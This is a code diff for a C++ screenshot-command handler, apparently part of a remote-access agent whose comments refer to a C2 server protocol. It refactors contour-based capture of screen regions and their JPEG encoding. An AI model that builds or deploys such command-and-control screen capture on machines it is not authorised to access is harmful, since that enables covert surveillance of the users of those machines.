@@ -10,6 +10,7 @@
 #include "vector.h"
 #include "system_info.h"
 #include "string.h"
+#include "image_processor.h"
 
 // =============================================================================
 // Wire-format directory entry — fixed layout matching the C2 server protocol.
@@ -424,6 +425,19 @@ VOID JpegCallback(PVOID context, PVOID data, INT32 size)
     jpegBuffer->offset += (UINT32)size;
 }
 
+PRGB CopyRGBData(UINT32 height, UINT32 width, Graphics &graphics, const ScreenDevice& device, UINT32 minX, UINT32 minY)
+{
+    PRGB rect = new RGB[height * width];
+    for (UINT32 j = 0; j < height; j++)
+    {
+        for (UINT32 k = 0; k < width; k++)
+        {
+            rect[j * width + k] = graphics.currentScreenshot[(minY + j) * device.Width + minX + k]; // Copy the pixel data from the screenshot to the rectangle buffer
+        }
+    }
+    return rect;
+}
+
 
 // Gets a screenshot of the specified display device
 VOID Handle_GetScreenshotCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
@@ -440,10 +454,7 @@ VOID Handle_GetScreenshotCommand([[maybe_unused]] PCHAR command, [[maybe_unused]
 
     // Ensure the VNC context exists - create it if it doesn't, and validate the result
     if (context->vncContext == nullptr)
-    {
-        auto vncResult = new VNCContext();
-        context->vncContext = vncResult;
-    }
+        context->vncContext = new VNCContext();
 
     // Getting the device list
     if (context->vncContext->DeviceList.Count == 0)
@@ -463,12 +474,9 @@ VOID Handle_GetScreenshotCommand([[maybe_unused]] PCHAR command, [[maybe_unused]
     const ScreenDevice &device = context->vncContext->DeviceList.Devices[displayIndex];
 
     // Check if graphics are initialized
-    if (context->vncContext->GraphicsList.count == 0)
-    {
-        context->vncContext->GraphicsList.graphicsArray = new Graphics[context->vncContext->DeviceList.Count];
-        context->vncContext->GraphicsList.count = context->vncContext->DeviceList.Count;
-    }
-
+    if (!context->vncContext->GraphicsList.IsInitialized())
+        context->vncContext->GraphicsList.Init(context->vncContext->DeviceList.Count);
+    
     // Get the Graphics structure for the specified display index and initialize buffers if they are not already allocated
     Graphics &graphics = context->vncContext->GraphicsList.graphicsArray[displayIndex];
     
@@ -562,67 +570,42 @@ VOID Handle_GetScreenshotCommand([[maybe_unused]] PCHAR command, [[maybe_unused]
             // find its size
             if (hierarchy[i].Parent == 1)
             {
-                // Check if the contour has points
                 INT32 minX = contoursArray[i].Points[0].Col, minY = contoursArray[i].Points[0].Row, maxX = 0, maxY = 0;
                 // Loop through the points in the contour to find the min and max coordinates to create a rectangle
-                for (INT32 j = 0; j < contoursArray[i].Count; j++)
-                {
-                    if (contoursArray[i].Points[j].Col < minX)
-                    {
-                        minX = contoursArray[i].Points[j].Col;
-                    }
-                    if (contoursArray[i].Points[j].Col > maxX)
-                    {
-                        maxX = contoursArray[i].Points[j].Col;
-                    }
-                    if (contoursArray[i].Points[j].Row < minY)
-                    {
-                        minY = contoursArray[i].Points[j].Row;
-                    }
-                    if (contoursArray[i].Points[j].Row > maxY)
-                    {
-                        maxY = contoursArray[i].Points[j].Row;
-                    }
-                }
+                GetContourBounds(&contoursArray[i], minX, minY, maxX, maxY);
 
                 // Calculate the width and height of the rectangle
-                INT32 rectWeight = maxX - minX + 1;
+                INT32 rectWidth = maxX - minX + 1;
                 INT32 rectHeight = maxY - minY + 1;
 
-                // Make strid dividable by 4(needed for GdipCreateBitmapFromScan0)
-                if (rectWeight % 4 != 0)
-                {
-                    rectWeight -= rectWeight % 4;
-                }
+                // Make strid dividable by 4 (needed for GdipCreateBitmapFromScan0)
+                if (rectWidth % 4 != 0)
+                    rectWidth -= rectWidth % 4;
+            
                 // Check if the rectangle is too small to be considered
-                if (rectHeight < 32 || rectWeight < 32)
-                {
+                if (rectHeight < 32 || rectWidth < 32)
                     continue;
-                }
+                
                 countOfContour++;
 
-                LOG_INFO("Rectangle: x: %d, y: %d, width: %d, height: %d.", minX, minY, rectWeight, rectHeight);
+                LOG_INFO("Rectangle: x: %d, y: %d, width: %d, height: %d.", minX, minY, rectWidth, rectHeight);
+                // LOG_INFO("Allocating memory for rectangle rgb data.");
 
-                LOG_INFO("Allocating memory for rectangle rgb data.");
                 // Allocate memory for the rectangle rgb data
-                rectScan0 = new RGB[rectHeight * rectWeight];
+                // rectScan0 = new RGB[rectHeight * rectWidth];
 
-                LOG_INFO("Memory allocated.");
+                // LOG_INFO("Memory allocated.");
+
                 // Copy the rectangle rgb data to buffer
-                for (INT32 j = 0; j < rectHeight; j++)
-                {
-                    for (INT32 k = 0; k < rectWeight; k++)
-                    {
-                        rectScan0[j * rectWeight + k] = graphics.currentScreenshot[(minY + j) * device.Width + minX + k]; // Copy the pixel data from the screenshot to the rectangle buffer
-                    }
-                }
+                rectScan0 = CopyRGBData((UINT32)rectHeight, (UINT32)rectWidth, graphics, device, (UINT32)minX, (UINT32)minY);
+
                 LOG_INFO("Rectangle rgb data copied.");
                 LOG_INFO("Encoding rectangle.");
 
                 // Prepare the JPEG buffer for encoding
                 jpegBuffer.offset = 0;
 
-                auto encodeResult = JpegEncoder::Encode(JpegCallback, &jpegBuffer, (INT32)quality, (INT32)rectWeight, (INT32)rectHeight, 3, Span<const UINT8>((UINT8 *)rectScan0, rectWeight * rectHeight * sizeof(RGB)));
+                auto encodeResult = JpegEncoder::Encode(JpegCallback, &jpegBuffer, (INT32)quality, (INT32)rectWidth, (INT32)rectHeight, 3, Span<const UINT8>((UINT8 *)rectScan0, rectWidth * rectHeight * sizeof(RGB)));
                 if (encodeResult.IsErr())
                 {
                     LOG_ERROR("Failed to encode JPEG image (error code: %e).", encodeResult.Error());
